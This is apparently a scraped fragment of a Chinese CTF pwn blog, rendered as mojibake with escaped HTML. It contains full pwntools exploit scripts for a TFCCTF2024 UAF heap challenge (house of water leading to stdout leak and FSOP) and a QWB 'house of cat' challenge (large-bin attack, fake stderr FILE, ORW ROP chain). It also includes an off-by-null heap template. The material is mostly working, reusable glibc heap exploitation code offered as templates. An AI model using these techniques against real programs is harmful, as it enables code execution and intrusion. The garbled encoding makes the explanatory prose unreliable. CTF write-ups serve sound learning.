å¯ä»¥åˆ†é…ä¸è¶…è¿‡255ä¸ªå †å—ï¼Œå †å—å¤§å°å¿…é¡»å°äº0x6FFï¼Œå¯ä»¥åœ¨ç”³è¯·çš„å †å—å†…ä»»æ„åœ°å€å†™&lt;br&gt;
delete:&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1723130760369.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å­˜åœ¨UAFæ¼æ´ï¼Œç„¶åå°±æ²¡äº†......&lt;br&gt;
æ•´ä¸ªç¨‹åºåªæœ‰ä¸ªUAFï¼Œè¿˜åªæœ‰addå’ŒdeleteåŠŸèƒ½ï¼Œ&lt;s&gt;è¿™å†™é›†è´¸å•Š&lt;/s&gt;ï¼Œè¿™æ—¶å°±è¦ç”¨åˆ°house of wateräº†&lt;/p&gt;
&lt;h2 id=&#34;æ€è€ƒ&#34;&gt;æ€è€ƒï¼š&lt;/h2&gt;
&lt;p&gt;é¦–å…ˆå¦‚æœè¦æ‹¿åˆ°shellæˆ–flagï¼Œå‰ææ˜¯çŸ¥é“libcåœ°å€ï¼Œä½†æ˜¯ç¨‹åºæ²¡æœ‰ä»»ä½•å¯ä»¥æ³„éœ²åœ°å€çš„åŠŸèƒ½ï¼Œæ‰€ä»¥å°±æƒ³åˆ°åŠ«æŒstdoutç»“æ„ä½“ï¼Œä½†æ˜¯é—®é¢˜æ¥äº†ï¼ŒåŠ«æŒä¹Ÿéœ€è¦libcåœ°å€ï¼Œæ‰€ä»¥æƒ³åˆ°ç”¨unsortedbinä¸­çš„æŒ‡é’ˆæ®‹ä½™æ¥å¾—åˆ°stdoutï¼Œä½ä¸‰ä½æ˜¯å·²çŸ¥çš„ï¼Œæ‰€ä»¥éœ€è¦çˆ†ç ´ç¬¬å››ä½ï¼Œ1/16çš„æ¦‚ç‡ï¼Œæ‰€ä»¥å°±æƒ³å¦‚ä½•èƒ½å¤Ÿä½¿biné“¾ä¸­å­˜åœ¨stdoutçš„åœ°å€ï¼Œhouse of waterç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªæ–¹æ³•&lt;br&gt;
ä¼—æ‰€å‘¨çŸ¥ï¼Œtcache_perthread_struct ç»“æ„ä½“ä¸­å­˜æ”¾ç€tcachebinä¸­æ¯ä¸€æ¡é“¾è¡¨çš„å…ƒç´ ä¸ªæ•°å’Œé“¾è¡¨å¤´ï¼Œå½“ä½ &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    add(0x3e8)#0
    add(0x3d8)#1
    free(0)
    free(1)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;tcache_perthread_struct ä¸­ä¼šå‡ºç°&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1723135416882.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1723132353878.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¿™é‡Œä»¥0x30ä¸ºä¾‹ï¼Œå‰é¢å¯ä»¥åˆ©ç”¨UAFä¿å­˜åˆ°0x5b0142ea8730æŒ‡é’ˆï¼Œfreeåtcache_perthread_structä¸­çš„0x30å¤§å°çš„ä½ç½®å°±è¢«å†™ä¸Šäº†0x5b0142ea8730ï¼Œåé¢å°±æ˜¯è®¾æ³•åœ¨unsortedbinä¸­æ„é€ è¿™æ ·çš„ç»“æ„A-&amp;gt;B-&amp;gt;Cï¼ŒBåº”è¯¥å°±æ˜¯0x10001è¿™ä¸ªchunkï¼Œéœ€è¦æ„é€ Cçš„bkå’ŒAçš„fdæŒ‡å‘é‚£ä¸ªchunkï¼Œåœ¨freeæ—¶å·²ç»ä½¿Bæœ‰äº†fdå’ŒbkæŒ‡é’ˆï¼ŒfdæŒ‡é’ˆå³0x5b0142ea8730ï¼Œæ‰€ä»¥éœ€è¦åœ¨0x5b0142ea8730å¤„æ„é€ ä¸€ä¸ªunsortedå¤§å°çš„chunkï¼Œæ­¤å¤„åˆæœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œå°±æ˜¯åœ¨tcachebinä¸­çš„æŒ‡é’ˆæŒ‡å‘çš„æ˜¯chunkçš„å†…å®¹ï¼Œå³mallocè¿”å›çš„å€¼ï¼Œåœ¨unsortedbinç­‰å…¶ä»–binä¸­ä¿å­˜çš„æ˜¯chunkçš„å¤´æŒ‡é’ˆï¼Œæ‰€ä»¥å¦‚æœè¦åœ¨0x5b0142ea8730å¤„æ„é€ ä¸€ä¸ªunsortedå¤§å°ï¼ˆ0x10000-0x17ff0èŒƒå›´ä»¥å¤–ï¼‰çš„chunkå°±è¦æƒ³åŠæ³•free(0x5b0142ea8740)ï¼Œå‰ææ˜¯æŠŠ0x5b0142ea8738çš„ä½ç½®å†™å…¥ä¸€ä¸ªunsortedbinå¤§å°èŒƒå›´å†…çš„sizeå€¼ï¼Œå¹¶ä¸”è¿™ä¸ªsizeè¿˜è¦åˆæ³•ï¼Œå³è¯¥chunkçš„åœ°å€åŠ ä¸Šsizeéœ€è¦æ˜¯å¦ä¸€ä¸ªchunkå¤´ï¼Œå¹¶ä¸”è¿™ä¸ªå¦ä¸€ä¸ªchunkçš„sizeçš„æœ«å°¾éœ€è¦æ˜¯1ï¼Œè¡¨æ˜è¿™ä¸ªchunkæ²¡è¢«é‡Šæ”¾è¿‡ï¼Œåˆ©ç”¨UAFå®ç°å †è¦†ç›–å¯ä»¥æˆåŠŸæ„é€ ï¼Œè¿™é‡Œä¹Ÿæ˜¯ç¬¬å››ä½éœ€è¦çˆ†ç ´ï¼Œ1/16çš„æ¦‚ç‡ï¼Œæ„é€ æˆåŠŸçš„æ•ˆæœå¦‚ä¸‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1723133842161.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è¿™é‡Œçš„0x615c78e5c080å³é‚£ä¸ª0x10001å¤§å°çš„chunkï¼Œæ­¤æ—¶å†éšä¾¿ç”³è¯·ä¸€ä¸ªå¤§å°çš„å †å—ï¼Œä¾¿å¯ä»¥æŠŠè¿™ä¸ªå¤§chunkæ•´åˆ°largebinä¸­ï¼Œä½¿åŸæ¥çš„fdå’ŒbkæŒ‡é’ˆå˜ä¸ºå’Œlibcæœ‰å…³çš„åœ°å€&lt;img src=&#34;https://l1u66.github.io//post-images/1723134055275.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;æ­¤æ—¶åœ¨è¿™ä¸ªå¤§å †ä¸­ç”³è¯·å †å—å³å¯æ§åˆ¶tcache_perthread_structå®ç°ä»»æ„åœ°å€åˆ†é…ï¼Œæ­¤æ—¶çˆ†ç ´stdoutçš„åœ°å€ï¼Œä½¿èƒ½å¤Ÿåˆ†é…åˆ°stdoutç»“æ„ä½“ï¼Œå®ç°åŠ«æŒæ³„éœ²libcåœ°å€ï¼Œç”±äºç¨‹åºæœ‰exitï¼ˆ0ï¼‰çš„åŠŸèƒ½ï¼Œå¯ä»¥æ‰“FSOPï¼Œæœ‰äº†libcåœ°å€åå°±å¯ä»¥é€šè¿‡åŠ«æŒstderræ‹¿åˆ°shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *

context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)

 
def meau(index):
    p.recvuntil(&#39;*&amp;gt;&#39;,timeout = 1)
    p.sendline(str(index))
 
def add(size,index=0,content=b&#39;a&#39;):#0x1790
    meau(1)
    p.recvuntil(&#39;how many guavas:&#39;)
    p.sendline(str(size))
    p.recvuntil(&#39;guavset:&#39;,timeout=1)
    p.sendline(str(index))
    p.recvuntil(&#39;guavas:&#39;)
    p.send(content)
 
def free(index):
    meau(2)
    p.recvuntil(&#39;guava no:&#39;)
    p.sendline(str(index))
while True:
    p = process(&#39;./guava&#39;)
    elf = ELF(&#39;./guava&#39;)
    libc = elf.libc
    add(0x600)#0
    add(0x600)#1
    add(0x600)#2
    add(0x600)#3
    add(0x600)#4
    add(0x600)#5
    add(0x600)#6
    free(0)
    free(1)
    free(2)
    free(3)
    free(4)
    free(5)
    add(0x488)#7
    add(0x488)#8  fake1 0x30
    add(0x498)#9
    add(0x488)#10  fake2 0x20
    free(7)
    free(8)
    free(9)
    free(10)

    add(0x498,0x488,p64(0x31))#11
    add(0x488)#12   end
    add(0x498,0x488,p64(0x21))#13
    add(0x488)#14 start
    free(11)
    free(12)
    free(13)
    free(14)
    free(8)
    free(10)

    add(0x3e8)#15
    add(0x3d8,0xa8,p64(0xdc1))#16
    add(0x608,0x5f8,p64(0x6b1))#17
    add(0x608)#18
    add(0x698)#19
    add(0x698)#20
    add(0x328)#21
    add(0x488)#22 middle
    add(0x328)#23
    free(15)
    free(16)
    free(17)
    free(18)
    free(19)
    free(20)
    add(0x578)#24
    add(0x200)#25
    add(0x308)#26
    add(0x200)#27
    add(0x200)#28
    add(0x200)#29
    add(0x200)#30
    add(0x678)#31
    for i in range(33):
        add(0x5f8)
    add(0x5c0,0x5b0,p64(0x10000)+p64(0x440))#65
    add(0x420)#66
    free(25)
    free(14)
    free(22)
    free(12)
    add(0x200,0x88,p16(0xc080))#67
    add(0x3d8,0xb0,p16(0xc080))#68
    free(67)
    free(68)
    gdb.attach(p,&amp;quot;b *$rebase(0x0000000000015F1)&amp;quot;)
    try:
            add(0x500) # 69
    except:
            p.close()
            continue
    add(0x198)# 70
    add(0x680)# 71
    add(0x680)# 72
    add(0x98)# 73
    add(0x90,0x8,p16(0xb780)) # 74
    try:
        add(0x28,0,p64(0xfbad1800)+p64(0)*3+b&#39;\x00\xb0&#39;) # 75
    except:
        p.close()
        continue
    p.recvuntil(b&#39;\xf0&#39;)
    p.recv(7)
    libc_base = u64(p.recv(6).ljust(8,b&#39;\x00&#39;)) - 2207728
 
    print(hex(libc_base))
 
    # ä»¤ size ä¸º 0x250 çš„ tcache æŒ‡å‘ _IO_2_1_stderr_
    add(0x100,0x58,p64(libc_base+libc.symbols[&#39;_IO_2_1_stderr_&#39;])) # 76
 
    fake_file = flat({
        0x0: b&amp;quot;  sh;&amp;quot;,
        0x28: libc_base + libc.symbols[&#39;system&#39;],
        0x88: libc_base + libc.symbols[&#39;_environ&#39;]-0x10,
        0xa0: libc_base+libc.symbols[&#39;_IO_2_1_stderr_&#39;]-0x40,   # _wide_data
        0xD8: libc_base + libc.symbols[&#39;_IO_wfile_jumps&#39;], # jumptable
    }, filler=b&amp;quot;\x00&amp;quot;)
 
    # åœ¨ _IO_2_1_stderr_ ä¸Šå†™ä¸Šæˆ‘ä»¬çš„ fake file
    add(0x200,0,fake_file)
     
    # é€€å‡ºç¨‹åºï¼Œæ‰§è¡Œ fsop æ”»å‡»
    meau(3)
    p.sendline(b&#39;cat flag.txt&#39;)
 
    p.interactive()
    break
&lt;/code&gt;&lt;/pre&gt;
">TFCCTF2024</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/gao-ban-ben-off-by-null/"" data-c="
          &lt;p&gt;æ¿å­ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#æ„é€ å †é£æ°´
    add(0,0x430)
    add(1,0x20)
    add(2,0x430)
    add(3,0x430)#æœ«å°¾\x00
    add(4,0x28)
    add(5,0x430)
    add(6,0x430)
    add(7,0x30)
    dele(0)
    dele(3)
    dele(6)
    dele(2)
    add(2,0x870)
    add(6,0x430)
    add(0,0x430)
    dele(2)
    #åˆ©ç”¨å †æ®‹ç•™è¿›è¡Œå †æŒ‡é’ˆæ„é€ 
    add(2,0x450,b&#39;a&#39;*0x438+p32(0x471))
    add(3,0x410)
    dele(0)
    dele(3)
    add(0,0x430,b&#39;a&#39;*8)
    dele(6)
    dele(5)
    add(5,0x870,b&#39;a&#39;*0x438+p64(0x441))
    dele(5)
    add(5,0x4f0)
    add(6,0x370)
    edit(4,b&#39;a&#39;*0x20+p64(0x30+0x440))
    dele(5)
    #æ­¤æ—¶offbynullåˆ©ç”¨æˆåŠŸï¼Œ4å·å †å—è¢«é‡å äº†
&lt;/code&gt;&lt;/pre&gt;
">é«˜ç‰ˆæœ¬off by null</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/qiang-wang-bei-house-of-cat/"" data-c="
          &lt;p&gt;å¯ä»¥è¯´æ˜¯IO+orwçš„æ¿å­é¢˜äº†ï¼Œè¿™é¢˜æ˜¯mainå‡½æ•°å†…ä¸€ç›´å¾ªç¯ï¼Œæ— æ³•é€šè¿‡mainå‡½æ•°çš„æ­£å¸¸é€€å‡ºæˆ–exitæ¥æ‰§è¡Œ_IO_flush_all_lockpå‡½æ•°åˆ·æ–°æ–‡ä»¶æµï¼Œæ ¹æ®house of KIWIï¼Œåœ¨malloc.cä¸­ï¼Œassertæ–­è¨€å¤±è´¥ï¼Œæœ€ç»ˆéƒ½ä¼šè°ƒç”¨&lt;code&gt;__malloc_assert&lt;/code&gt; ï¼Œè€Œå…¶ä¸­æœ‰ä¸€ä¸ªfflush (stderr)çš„å‡½æ•°è°ƒç”¨ï¼Œä¼šèµ°&lt;code&gt;stderr&lt;/code&gt;çš„IO_FILEï¼Œæœ€ç»ˆä¼šè°ƒç”¨åˆ°å…¶vtableä¸­_IO_file_jumpsä¸­çš„__IO_file_syncï¼Œæ­¤æ—¶rdxä¸ºIO_helper_jumps&lt;/p&gt;
&lt;h1 id=&#34;è§¦å‘io&#34;&gt;è§¦å‘IO&lt;/h1&gt;
&lt;p&gt;FSOPæœ‰ä¸‰ç§æƒ…å†µï¼ˆèƒ½ä»mainå‡½æ•°ä¸­è¿”å›ã€ç¨‹åºä¸­èƒ½æ‰§è¡Œexitå‡½æ•°ã€libcä¸­æ‰§è¡Œabortï¼‰ï¼Œç¬¬ä¸‰ç§æƒ…å†µåœ¨é«˜ç‰ˆæœ¬ä¸­å·²ç»åˆ é™¤;__malloc_assertåˆ™æ˜¯åœ¨mallocä¸­è§¦å‘ï¼Œé€šå¸¸æ˜¯ä¿®æ”¹top chunkçš„å¤§å°ã€‚&lt;/p&gt;
&lt;h1 id=&#34;__malloc_assert&#34;&gt;__malloc_assert&lt;/h1&gt;
&lt;p&gt;house of kiwiæä¾›äº†ä¸€ç§è°ƒç”¨è¯¥å‡½æ•°çš„æ€è·¯ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹topchunkçš„å¤§å°è§¦å‘ï¼Œå³æ»¡è¶³ä¸‹åˆ—æ¡ä»¶ä¸­çš„ä¸€ä¸ª&lt;br&gt;
1.topchunkçš„å¤§å°å°äºMINSIZE(0X20)&lt;br&gt;
2.prev inuseä½ä¸º0&lt;br&gt;
3.old_topé¡µæœªå¯¹é½&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;assert ((old_top == initial_top (av) &amp;amp;&amp;amp; old_size == 0) ||
        ((unsigned long) (old_size) &amp;gt;= MINSIZE &amp;amp;&amp;amp;
         prev_inuse (old_top) &amp;amp;&amp;amp;
         ((unsigned long) old_end &amp;amp; (pagesize - 1)) == 0));
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;é¢˜ç›®ä¿¡æ¯&#34;&gt;é¢˜ç›®ä¿¡æ¯&lt;/h1&gt;
&lt;p&gt;(&lt;s&gt;çœå»äº†é€†å‘å†…å®¹ï¼Œä¸»è¦æ˜¯å­¦ä¹ æ¿å­&lt;/s&gt;)è¯¥é¢˜æä¾›äº†UAFæ¼æ´å’Œä¸¤æ¬¡editï¼Œé™åˆ¶äº†å †å—æ•°ç›®ä¸è¶…è¿‡15ä¸ªï¼Œé™åˆ¶äº†å †å—å¤§å°[0x418,0x470)ï¼Œå¼€äº†æ²™ç›’åªèƒ½orwä¸”readçš„ç¬¬ä¸€ä¸ªå‚æ•°åªèƒ½æ˜¯0ï¼Œæ‰€ä»¥éœ€è¦å…ˆclose(0)ï¼Œå†openï¼Œå¹¶ä¸”é™åˆ¶äº†editçš„è¾“å…¥å¤§å°ï¼ˆä¸è¶…è¿‡0x30ï¼‰,æ‰€ä»¥åªèƒ½æå‰ç”¨addå¸ƒç½®å¥½fake ioå’Œropé“¾&lt;/p&gt;
&lt;h1 id=&#34;åŠ«æŒçš„è°ƒç”¨é“¾&#34;&gt;åŠ«æŒçš„è°ƒç”¨é“¾ï¼š&lt;/h1&gt;
&lt;p&gt;__malloc_assert&lt;br&gt;
---&amp;gt;__fxprintf&lt;br&gt;
-------&amp;gt;_IO_wfile_jumpsçš„vtable&lt;br&gt;
-----------&amp;gt;_IO_wfile_seekoff&lt;br&gt;
---------------&amp;gt;_IO_switch_to_wget_mode&lt;/p&gt;
&lt;h1 id=&#34;æ”»å‡»æ€è·¯house-of-cat&#34;&gt;æ”»å‡»æ€è·¯ï¼ˆhouse of catï¼‰ï¼š&lt;/h1&gt;
&lt;p&gt;é€šè¿‡ç¬¬ä¸€æ¬¡largebin attackåŠ«æŒstderrï¼Œç„¶åæ§åˆ¶vtableä¸º_IO_wfile_jumps+0x10ï¼ŒåŠ«æŒ_IO_wfile_seekoffä¸ºmagic_gadgetï¼Œå°†rbpè½¬ç§»åˆ°ropä¸Šï¼Œç„¶ååˆ©ç”¨callè°ƒç”¨leave retæ‰§è¡Œropé“¾ï¼Œæœ€åé€šè¿‡ç¬¬äºŒæ¬¡llargebin attackéƒ¨åˆ†æ”¹å†™top chunkï¼ˆå°†å…¶æ”¹å°ï¼‰ï¼Œç„¶åè°ƒç”¨mallocå³å¯è§¦å‘__malloc_assertæ‰“å°å‡ºflag&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context.log_level = &#39;debug&#39;
context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)

#p = remote(&#39;43.142.108.3&#39;, 28290)
p = process(&#39;./house_of_cat&#39;)
elf = ELF(&#39;./house_of_cat&#39;)
libc = elf.libc


def s(x): return p.send(x)
def sa(x, y): return p.sendafter(x, y)
def sla(x, y): return p.sendlineafter(x, y)
def sl(x): return p.sendline(x)
def rv(): return p.recv()
def ru(x): return p.recvuntil(x)
def rvl(): return p.recvline()
def lg(x, y): return log.info(f&#39;{x} =&amp;gt; {hex(y)}&#39;)


sa(b&#39;mew mew mew~~~~~~&#39;, b&#39;LOGIN | r00t QWB QWXFadmin&#39;)


def add(idx, size, data = b&#39;\x00&#39;):  # [0x418,0x470)
    sa(&#39;mew mew mew~~~~~~&#39;, &#39;CAT | r00t QWB QWXF$\xff&#39;)
    sla(&#39;plz input your cat choice:\n&#39;, b&#39;1&#39;)
    sla(&#39;plz input your cat idx:\n&#39;, str(idx))
    sla(&#39;plz input your cat size:\n&#39;, str(size))
    sa(&#39;plz input your content:\n&#39;, data)


def delete(idx):  # uaf
    sa(&#39;mew mew mew~~~~~~&#39;, &#39;CAT | r00t QWB QWXF$\xff&#39;)
    sla(&#39;plz input your cat choice:\n&#39;, b&#39;2&#39;)
    sla(&#39;plz input your cat idx:\n&#39;, str(idx))


def show(idx):
    sa(&#39;mew mew mew~~~~~~&#39;, &#39;CAT | r00t QWB QWXF$\xff&#39;)
    sla(&#39;plz input your cat choice:\n&#39;, b&#39;3&#39;)
    sla(&#39;plz input your cat idx:\n&#39;, str(idx))


def edit(idx, data):
    sa(&#39;mew mew mew~~~~~~&#39;, &#39;CAT | r00t QWB QWXF$\xff&#39;)
    sla(&#39;plz input your cat choice:\n&#39;, b&#39;4&#39;)
    sla(&#39;plz input your cat idx:\n&#39;, str(idx))
    sa(&#39;plz input your content:\n&#39;, data)


add(0xe,0x450,&#39;a&#39;)
add(0xd,0x450,&#39;a&#39;)
delete(0xe)
add(0xc,0x460,&#39;a&#39;)
show(0xe)
p.recvuntil(&#39;Context:\n&#39;)
p.recv(8)
libc_base=u64(p.recv(6).ljust(8, b&#39;\0&#39;))-0x21a0e0
p.recv(10)
large = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
heap_base=large-0x290
IO_list_all=libc_base+libc.symbols[&#39;_IO_list_all&#39;]
magic_gadget=libc_base+0x16a1fa
&amp;quot;&amp;quot;&amp;quot;
&amp;lt;svcudp_reply+26&amp;gt;:    mov    rbp,QWORD PTR [rdi+0x48]
&amp;lt;svcudp_reply+30&amp;gt;:    mov    rax,QWORD PTR [rbp+0x18]
&amp;lt;svcudp_reply+34&amp;gt;:    lea    r13,[rbp+0x10]
&amp;lt;svcudp_reply+38&amp;gt;:    mov    DWORD PTR [rbp+0x10],0x0
&amp;lt;svcudp_reply+45&amp;gt;:    mov    rdi,r13
&amp;lt;svcudp_reply+48&amp;gt;:    call   QWORD PTR [rax+0x28]
&amp;quot;&amp;quot;&amp;quot;
leave_ret=libc_base+0x00000000000562ec
add_rsp_ret=libc_base+0x000000000003a889
stderr_ptr=0x21a860+libc_base
lock=libc_base+0x21ba60
pop_rdi=libc_base+0x000000000002a3e5
pop_rsi=libc_base+0x000000000002be51
pop_rdx_r12=libc_base+0x000000000011f497
pop_rax_ret=libc_base+0x0000000000045eb0
ret = libc_base+0x0000000000029cd6
syscall=libc_base+0xea5b9
read_addr=libc_base+libc.symbols[&#39;read&#39;]
write_addr=libc_base+libc.symbols[&#39;write&#39;]
close_addr=libc_base+libc.symbols[&#39;close&#39;]

add(0xb,0x450,&#39;a&#39;)

fake_io_addr = heap_base + 0xfc0
flag_str_addr = fake_io_addr + 0x1a8
flag_content_addr = heap_base + 0x600
setcontext = libc_base + libc.sym[&#39;setcontext&#39;]
_IO_wfile_jumps = libc_base + libc.sym[&#39;_IO_wfile_jumps&#39;]
rop_chain = p64(pop_rdi) + p64(flag_str_addr) + p64(libc.sym[&#39;open&#39;]) #open(&amp;quot;./flag.txt&amp;quot;,0);
rop_chain += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_content_addr) + p64(pop_rdx_r12) + p64(0x50) + p64(0) + p64(libc.sym[&#39;read&#39;])#read(3,flag_addr2,0x50);
rop_chain += p64(pop_rdi) + p64(1) + p64(libc.sym[&#39;write&#39;])#write(1,flag_addr2,0x50);


#close
rop=p64(pop_rdi)
rop+=p64(0)
rop+=p64(close_addr)

#open
rop+=p64(pop_rdi)
rop+=p64(flag_str_addr)# &#39;flag&#39; address
rop+=p64(pop_rsi)
rop+=p64(0)
rop+=p64(pop_rax_ret)
rop+=p64(2)
rop+=p64(syscall)

#read
rop+=p64(pop_rdi)
rop+=p64(0)
rop+=p64(pop_rsi)
rop+=p64(flag_content_addr)# flag store address
rop+=p64(pop_rdx_r12)
rop+=p64(0x50)
rop+=p64(0)
rop+=p64(read_addr)

#write
rop+=p64(pop_rdi)
rop+=p64(1)
rop+=p64(pop_rsi)
rop+=p64(flag_content_addr)# flag store address
rop+=p64(pop_rdx_r12)
rop+=p64(0x50)
rop+=p64(0)
rop+=p64(write_addr)


fake_stderr = flat({
    0x38: p64(fake_io_addr+0x1f0),
    0x78: p64(lock),
    0x90: p64(fake_io_addr+0xe0),
    0xc8: p64(_IO_wfile_jumps + 0x10),
    0xf0: p64(1),
    0x198: b&amp;quot;flag\x00\x00\x00\x00&amp;quot;,
    0x1b0: p64(fake_io_addr+0x1b0),
    0x1b8: p64(magic_gadget),
    0x1e0: p64(0xdeadbeef),
    0x1e8: p64(add_rsp_ret),
    0x1f0: p64(0xdeadbeef),
    0x1f8: p64(0x1e8+fake_io_addr),
    0x200: p64(leave_ret),
    #rop
    0x208:rop
},filler=b&#39;\00&#39;)


# fake_io_addr = heap_base + 0xfc0
# wide_data=p64(0)*4+p64(1)
# wide_data+=p64(0)*20
# wide_data+=b&amp;quot;flag\x00\x00\x00\x00&amp;quot;
# wide_data+=p64(0)
# wide_data+=p64(0)
# wide_data+=p64(fake_io_addr+0x1b0)#wide_vtable
# wide_data+=p64(magic_gadget)#first call
# wide_data+=p64(0)*3
# wide_data+=p64(0)#                        raxå³0x1178+0x30+heap_base
# wide_data+=p64(0xdeadbeef)#                   rbpå³heap_base+0x1180+0x30
# wide_data+=p64(add_rsp_ret)      #        add    rsp,0x18
# wide_data+=p64(0xdeadbeef)
# wide_data+=p64(0x1e8+fake_io_addr)#   [rbp+0x18]  
# wide_data+=p64(leave_ret)          #second call  [rax+0x28]
# wide_data+=rop


# io_file=p64(0)*7
# io_file+=p64(fake_io_addr+0x1f0)#  rbp   io_save_base   [rdi+0x48]   
# io_file+=p64(0)*7
# io_file+=p64(lock)+p64(0)*2
# io_file+=p64(fake_io_addr+0xe0)#wide_data
# io_file+=p64(0)*6
# io_file+=p64(libc_base+0x2160c0+0x10)#vtable   _IO_wfile_jumps+0x10
# io_file+=wide_data



add(0,0x428,fake_stderr)#0xwfile 2160c0
add(0xf,0x460,&#39;prevent merge chunk&#39;)
add(1,0x418,&#39;a&#39;)
delete(0)
add(2,0x460,&#39;a&#39;)
edit(0,p64(libc_base+0x21a0d0)*2+p64(0)+p64(stderr_ptr-0x20))
delete(1)
add(3,0x440,&#39;large bin attack chunk&#39;)

add(4,0x418,&#39;a&#39;)
print(&#39;libc_base&#39;,hex(libc_base))
print(&#39;heap_base&#39;,hex(heap_base))
print(&#39;stderr_ptr&#39;,hex(stderr_ptr))
print(&#39;_IO_wfile_jumps&#39;,hex(_IO_wfile_jumps + 0x10))
print(&#39;fake_io_addr&#39;,hex(fake_io_addr))
gdb.attach(p)


# second large bin attack
add(7,0x460,&#39;a&#39;)
add(8,0x430,&#39;a&#39;)

delete(3)
add(9,0x460,&#39;a&#39;)
edit(3,p64(large)+p64(large)+p64(0)+p64(0x3265-2+heap_base-0x20))
delete(8)

p.sendafter(&amp;quot;mew mew mew~~~~~~\n&amp;quot;,&#39;CAT | r00t QWB QWXF$\xff&#39;)
p.sendlineafter(&amp;quot;plz input your cat choice:\n&amp;quot;,str(1))
p.sendlineafter(&amp;quot;plz input your cat idx:\n&amp;quot;,str(6))
p.sendlineafter(&amp;quot;plz input your cat size:\n&amp;quot;,str(0x46f))
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;æ¿å­&#34;&gt;æ¿å­ï¼š&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;magic_gadget=libc_base+0x16a1fa
&amp;quot;&amp;quot;&amp;quot;
&amp;lt;svcudp_reply+26&amp;gt;:    mov    rbp,QWORD PTR [rdi+0x48]
&amp;lt;svcudp_reply+30&amp;gt;:    mov    rax,QWORD PTR [rbp+0x18]
&amp;lt;svcudp_reply+34&amp;gt;:    lea    r13,[rbp+0x10]
&amp;lt;svcudp_reply+38&amp;gt;:    mov    DWORD PTR [rbp+0x10],0x0
&amp;lt;svcudp_reply+45&amp;gt;:    mov    rdi,r13
&amp;lt;svcudp_reply+48&amp;gt;:    call   QWORD PTR [rax+0x28]
&amp;quot;&amp;quot;&amp;quot;
fake_io_addr = heap_base + 0xfc0
flag_str_addr = fake_io_addr + 0x1a8
flag_content_addr = heap_base + 0x600
setcontext = libc_base + libc.sym[&#39;setcontext&#39;]
_IO_wfile_jumps = libc_base + libc.sym[&#39;_IO_wfile_jumps&#39;]
rop_chain = p64(pop_rdi) + p64(flag_str_addr) + p64(libc.sym[&#39;open&#39;]) #open(&amp;quot;./flag.txt&amp;quot;,0);
rop_chain += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_content_addr) + p64(pop_rdx_r12) + p64(0x50) + p64(0) + p64(libc.sym[&#39;read&#39;])#read(3,flag_addr2,0x50);
rop_chain += p64(pop_rdi) + p64(1) + p64(libc.sym[&#39;write&#39;])#write(1,flag_addr2,0x50);

#close
rop=p64(pop_rdi)
rop+=p64(0)
rop+=p64(close_addr)

#open
rop+=p64(pop_rdi)
rop+=p64(flag_str_addr)# &#39;flag&#39; address
rop+=p64(pop_rsi)
rop+=p64(0)
rop+=p64(pop_rax_ret)
rop+=p64(2)
rop+=p64(syscall)

#read
rop+=p64(pop_rdi)
rop+=p64(0)
rop+=p64(pop_rsi)
rop+=p64(flag_content_addr)# flag store address
rop+=p64(pop_rdx_r12)
rop+=p64(0x50)
rop+=p64(0)
rop+=p64(read_addr)

#write
rop+=p64(pop_rdi)
rop+=p64(1)
rop+=p64(pop_rsi)
rop+=p64(flag_content_addr)# flag store address
rop+=p64(pop_rdx_r12)
rop+=p64(0x50)
rop+=p64(0)
rop+=p64(write_addr)
fake_stderr = flat({
    0x38: p64(fake_io_addr+0x1f0),#  rbp   io_save_base   [rdi+0x48]   
    0x78: p64(lock),
    0x90: p64(fake_io_addr+0xe0),#wide_data
    0xc8: p64(_IO_wfile_jumps + 0x10),#vtable   _IO_wfile_jumps+0x10
    0xf0: p64(1),
    0x198: b&amp;quot;flag\x00\x00\x00\x00&amp;quot;,
    0x1b0: p64(fake_io_addr+0x1b0),#wide_vtable
    0x1b8: p64(magic_gadget),#first call
    0x1e0: p64(0xdeadbeef),#                   rbpå³heap_base+0x1180+0x30
    0x1e8: p64(add_rsp_ret), #add    rsp,0x18
    0x1f0: p64(0xdeadbeef),
    0x1f8: p64(0x1e8+fake_io_addr),#   [rbp+0x18]  
    0x200: p64(leave_ret), #second call  [rax+0x28]
    #rop
    0x208:rop
},filler=b&#39;\00&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦ä¸€ç§å½¢å¼&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fake_io_addr = heap_base + 0xfc0

wide_data=p64(0)*4+p64(1)
wide_data+=p64(0)*20
wide_data+=b&amp;quot;flag\x00\x00\x00\x00&amp;quot;
wide_data+=p64(0)
wide_data+=p64(0)
wide_data+=p64(fake_io_addr+0x1b0)#wide_vtable
wide_data+=p64(magic_gadget)#first call
wide_data+=p64(0)*3
